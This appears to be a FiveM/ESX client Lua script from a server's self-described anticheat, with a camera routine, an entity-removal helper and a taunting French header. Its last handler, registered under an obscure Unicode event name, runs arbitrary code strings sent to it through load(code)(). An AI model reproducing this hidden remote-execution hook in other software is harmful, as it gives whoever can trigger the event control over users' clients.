-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

Citizen.CreateThread(function()
	while ESX == nil do
    	TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
    	Citizen.Wait(0)
	end
end)

function CreateCamera()
	Citizen.Wait(1)
	local coords = GetEntityCoords(PlayerPedId())
    cam = CreateCam("DEFAULT_SCRIPTED_CAMERA", true)
    SetCamCoord(cam, coords + 2.0)
    SetCamFov(cam, 50.0)
    PointCamAtCoord(cam, vector3(coords.x, coords.y, coords.z + 1.0))
    SetCamShakeAmplitude(cam, 13.0)
    RenderScriptCams(true, true, 1500, true, true)
end

function RemoveObj(id)
	Citizen.CreateThread(function()
		SetNetworkIdCanMigrate(id, true)
		local entity = NetworkGetEntityFromNetworkId(id)
		NetworkRequestControlOfEntity(entity)
		local test = 0

		while test > 100 and not NetworkHasControlOfEntity(entity) do
			NetworkRequestControlOfEntity(entity)
			DetachEntity(entity, false, false)
			Wait(1)
			test = test + 1
		end

		SetEntityAsNoLongerNeeded(entity)
		local test = 0

		while test < 100 and IsEntityAttached(entity) do 
			DetachEntity(entity, false, false)
			Wait(1)
			test = test + 1
		end

		local test = 0

		while test < 100 and DoesEntityExist(entity) do 
			DetachEntity(entity, false, false)
			SetEntityAsNoLongerNeeded(entity)
			DeleteEntity(entity)
			SetEntityCoords(entity, vector3(0.0, 0.0, 0.0), false, false, false, false)
			Wait(1)
			test = test + 1
		end
	end)
end

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)